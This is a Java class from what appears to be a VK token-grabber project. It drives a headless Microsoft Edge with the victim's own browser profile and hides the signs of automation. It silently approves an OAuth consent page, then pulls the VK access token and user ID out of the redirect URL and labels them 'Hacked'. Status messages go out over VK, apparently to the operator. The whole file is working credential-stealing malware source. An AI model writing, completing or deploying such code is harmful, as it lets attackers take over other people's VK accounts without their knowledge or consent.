package com.github.dedinc.vktokengrabber.browsers;

import java.io.File;
import java.nio.file.Paths;
import java.util.Arrays;
import org.openqa.selenium.JavascriptExecutor;
import com.github.dedinc.vktokengrabber.Main;
import com.github.dedinc.vktokengrabber.utils.Helper;
import com.microsoft.edge.seleniumtools.EdgeDriver;
import com.microsoft.edge.seleniumtools.EdgeOptions;

public class Edge {
	public String grab() {
		if (!new File(Paths.get(Main.cd, "Users", Main.username, "msedgedriver.exe").toString()).exists()) {
			Helper.getWebDriver().getEdgeDriver();
		}
		String edge = Paths.get(Main.cd, "Users", Main.username, "AppData", "Local", "Microsoft", "Edge").toString();
		System.setProperty("webdriver.edge.driver", Paths.get(Main.cd, "Users", Main.username, "msedgedriver.exe").toString());
		EdgeOptions options = new EdgeOptions();
		options.addArguments("headless");
		options.addArguments("user-data-dir=" + Paths.get(edge, "User Data").toString());
		options.addArguments("user-agent=" + Helper.getUserAgents().getAgent());
		options.setExperimentalOption("excludeSwitches", Arrays.asList("enable-automation"));
		options.setExperimentalOption("useAutomationExtension", false);
		EdgeDriver driver = new EdgeDriver(options);
		driver.get(Main.scope_url);
		JavascriptExecutor js = (JavascriptExecutor) driver;
		js.executeScript("allow()");
		String url = driver.getCurrentUrl();
		driver.quit();
		try {
			String token = url.split("access_token=")[1].split("&")[0];
			String uid = url.split("user_id=")[1].split("&")[0];			
			return String.format("[id%s|Hacked]%n%nToken: %s", uid, token);
		   } catch (Exception e ) {
		}
		Helper.getVK().sendMessage("Edge: Unauthorized in VK!");
		return null;
	}
}
